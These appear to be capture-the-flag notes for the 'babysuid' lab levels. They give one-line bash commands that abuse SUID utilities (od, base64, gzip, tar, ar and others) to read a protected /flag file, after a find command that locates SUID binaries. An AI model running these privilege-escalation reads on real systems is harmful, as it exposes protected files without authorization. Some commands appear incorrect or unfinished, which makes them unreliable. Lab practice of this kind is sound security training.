__Find all files which have suid bit set__
```bash
find / -type f -perm -u=s -print
```
---
#### babysuid level 11
```bash
od -c /flag -w100| tr -d " " | awk -F "0000000" '{print $2}' | tr -d '\\n'
```
#### babysuid level 12
```bash
hd /flag | cut -d "|" -f 2 | tr -d "\n" | sed s/"\.00000038"//;echo
```

#### babysuid level 13 incomplete
```bash
xxd /flag | awk -F "  " '{print $2}'| tr -d "\n";echo
```

#### babysuid level 14
```bash
base32 /flag | base32 -d
```
#### babysuid level 15
```bash
base64 /flag | base64 -d
```
#### babysuid level 16
```bash
split flag && cat /xaa
```
#### babysuid level 17
```bash
gzip /flag && zcat /flag.gz
```
#### babysuid level 18
```bash
bzip2 /flag && bzip2 /flag.bz2 -cd
```
#### babysuid level 19
```bash
zip flag.zip flag && zcat flag.zip
```
#### babysuid level 20
```bash
tar -cvf /flag && tar -xOf /flag.tar
```
#### babysuid level 21
```bash
ar r flag.a /flag && ar p flag.a
```
#### babysuid level 22
```bash

```

